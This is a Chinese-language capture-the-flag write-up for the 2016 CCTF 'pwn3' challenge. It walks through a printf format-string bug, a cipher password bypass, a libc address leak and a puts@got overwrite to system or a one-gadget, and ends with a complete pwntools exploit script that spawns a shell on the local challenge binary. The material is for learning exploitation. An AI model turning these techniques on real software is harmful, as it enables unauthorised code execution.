## 2016 CCTF pwn3

**考点：格式化字符串、hijack GOT、堆**

### 分析

#### 保护情况

32 位动态链接；打开 NX ；RELRO 部分保护，可以改 GOT 表地址

```shell
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```
#### 漏洞函数

程序实现的输出功能存在格式化字符串漏洞。函数将内容写入到 dest 中，在用 printf 输出，而 dest 内容是可控的。

```c
int get_file()
{
  char dest; // [esp+1Ch] [ebp-FCh]
  char s1; // [esp+E4h] [ebp-34h]
  char *i; // [esp+10Ch] [ebp-Ch]

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &s1);
  if ( !strncmp(&s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
  {
    if ( !strcmp(i, &s1) )
    {
      strcpy(&dest, i + 40);
      return printf(&dest);//格式化字符串
    }
  }
  return printf(&dest);//格式化字符串
}
```

### 思路

整体攻击工程：

- 绕过密码
- 确定格式化字符串参数偏移
- 利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。
- 修改 puts@got 的内容为 system 的地址。
- 当程序再次执行 puts 函数的时候，其实执行的是 system 函数。

#### 绕过密码

简单移位密码，移动位数是 1 。密文是：``sysbdmin``，对应明文是：``rxraclhm``。

```c
__isoc99_scanf("%40s", src);
for ( i = 0; i <= 39 && src[i]; ++i )
    ++src[i];
```

#### 确定格式化字符串参数偏移

我还是使用自己熟悉的方法泄露出地址（写一堆%p），懒得计算，偏移为 7 ：

![fmrstr_1.png](..\..\..\img\fmrstr_1.png)

#### 泄露 libc 地址

content 是存在堆中的，不是栈上的，也就搞不到栈上的 libc 函数地址，但是堆中内容是可控的，我们可以往里面写入 libc 函数地址，然后在读出来就行了。

```python
payload = "%8$s" + p32(puts_got)
creat('aaaa',payload)
show('aaaa')
puts_leak = u32(p.recv(4))
```

#### 修改 got 表

修改还是用的 格式化字符串 ，需要做的就是将 payload 写入到堆中，然后用程序的 get 功能触发漏洞。payload 的话可以用 pwntools 工具构建，32 位的问题不大，64 位的话我选择手动。

覆盖方式多种多样了，下面的是最后实现调用 ``system('/bin/sh')``：

```python
payload = fmtstr_payload(7, {puts_got: system})
creat('/bin/sh;', payload)		# write 2 chunk
show('/bin/sh;')				# overwrite puts@got 2 system@got
showlist()						# getshell
```

这个堆名要是 ``/binsh;`` ，/bin/sh 的话是 showlist 时作为 system 参数。``;`` 是用来分割前面我们用来泄露地址的堆名，如果不加最后构造出来是：``system('/bin/shaaaa')``

另外一种填充方式就是：将 puts@got 填充为 onegadget ，这样就不需要对堆名有要求了。

```python
payload = fmtstr_payload(7, {puts_got: onegadget})
creat('bbbb', payload)
show('bbbb')
```

### exp

```exp
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
# @File    : pwn3.py
from pwn import *
context.log_level = 'debug'

p = process("./pwn3")
elf = ELF("./pwn3")
libc = ELF("./libc.so")

def creat(name,content):
    p.recvuntil("ftp>")
    p.sendline("put")
    p.recvuntil("upload:")
    p.sendline(name)
    p.recvuntil("content:")
    p.sendline(content)
def show(name):
    p.recvuntil("ftp>")
    p.sendline("get")
    p.recvuntil("get:")
    p.sendline(name)
def showlist():
    p.recvuntil("ftp>")
    p.sendline("dir")

name = "rxraclhm"
puts_got = elf.got['puts']
log.info("puts_got:"+hex(puts_got))

p.recvuntil("Rainism):")
p.sendline(name)

# leak libc
payload = "%8$s" + p32(puts_got)
creat('aaaa',payload)
show('aaaa')

puts_leak = u32(p.recv(4))
log.info("puts_leak:"+hex(puts_leak))
libc_base = puts_leak - libc.symbols['puts']
log.info("libc_base:"+hex(libc_base))
system = libc_base + libc.symbols['system']
log.info("system:"+hex(system))
binsh = libc_base + libc.search('/bin/sh').next()
log.info("binsh:"+hex(binsh))
onegadget = libc_base + 0x3ac62
log.info("onegadget:"+hex(onegadget))

# 1:overcover puts@got 2 system@got

#payload = fmtstr_payload(7, {puts_got: system})
#creat('/bin/sh;', payload)
#show('/bin/sh;')
#showlist()

# 2:overcover puts@got 2 onegadget
payload = fmtstr_payload(7, {puts_got: onegadget})
creat('bbbb', payload)
show('bbbb')

p.interactive()
```



